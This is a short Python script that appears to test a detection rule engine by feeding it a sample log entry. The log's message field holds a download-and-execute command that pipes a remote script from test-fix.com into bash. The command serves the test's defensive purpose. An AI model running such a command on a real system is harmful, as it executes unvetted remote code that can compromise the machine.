import sys
import os
sys.path.append('/app')
from app import db as database
from app.services.rule_engine import RuleEngine

log = {
    "agent_id": "manual-test",
    "hostname": "MuG1War4",
    "message": "curl http://test-fix.com/sh | bash"
}

db = database.SessionLocal()
try:
    engine = RuleEngine(db)
    print("Testing manual detection...")
    engine.evaluate_raw(log)
    print("Test complete.")
finally:
    db.close()
